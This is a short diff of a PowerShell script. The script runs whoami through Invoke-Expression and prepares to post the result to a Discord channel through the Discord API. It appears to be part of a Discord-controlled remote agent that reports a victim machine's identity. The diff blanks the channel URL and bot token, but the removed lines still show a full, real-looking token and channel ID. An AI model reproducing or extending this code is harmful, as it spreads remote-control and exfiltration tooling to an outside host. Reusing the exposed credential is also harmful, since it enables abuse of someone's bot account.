@@ -1,12 +1,12 @@
 # <ping> "to get name of client's"
 # <"the name of client">ls
 
-Start-Sleep -Seconds 1
+Start-Sleep -Seconds 10
 
 $WhoAmI_Output = Invoke-Expression -Command "whoami"
 
-$url = "https://discord.com/api/v9/channels/1210194870850031656/messages"
-$discordToken = "MTE5ODY3Njc4NTg5MDYwNzE3Nw.GnqMWY.3rwKiCVRerCjS_meDerhJDfubEZWbrwbrsYA_k"
+$url = ""
+$discordToken = ""
 
 $headers = @{
     Authorization = $discordToken
